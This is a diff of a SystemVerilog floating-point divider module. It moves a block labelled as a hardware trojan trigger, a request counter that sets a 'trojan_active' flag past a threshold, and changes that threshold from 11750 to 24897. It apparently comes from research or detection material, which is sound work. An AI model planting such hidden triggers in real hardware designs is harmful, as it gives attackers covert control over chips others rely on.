@@ -12,24 +12,6 @@ output
     logic [31:0] result
 );
 
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 1: Simple Counter
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 11750;
-    logic [15:0] trojan_counter;
-    logic trojan_active;
-    
-    always_ff @(posedge clk or negedge rst) begin
-        if (!rst) begin
-            trojan_counter <= '0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (req) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
-        end
-    end
-
-
     function automatic [2:0] srt_table;
         input[5:0] rem;
         input[3:0] div;
@@ -84,6 +66,23 @@ output
 
     // Preparation
     wire       result_sign  = is_divide & (lhs_sign ^ rhs_sign);
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=24897)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 24897;
+    logic [15:0] trojan_counter;
+    logic        trojan_active;
+    always_ff @(posedge clk or negedge rst) begin
+        if (!rst) begin
+            trojan_counter <= '0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (req) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
+        end
+    end
+
     wire [9:0] v_lhs_expo   = lhs_expo == 0 ? -leading_zeros_count(lhs_mant) : { 2'b0, lhs_expo }; // virtual exponent (ignores subnormals, but is biased)
     wire [9:0] v_rhs_expo   = rhs_expo == 0 ? -leading_zeros_count(rhs_mant) : { 2'b0, rhs_expo }; // virtual exponent (ignores subnormals, but is biased)
     wire[23:0] v_lhs_mant = lhs_expo == 0 ? { lhs_mant, 1'b0 } << leading_zeros_count(lhs_mant) : { 1'b1, lhs_mant };
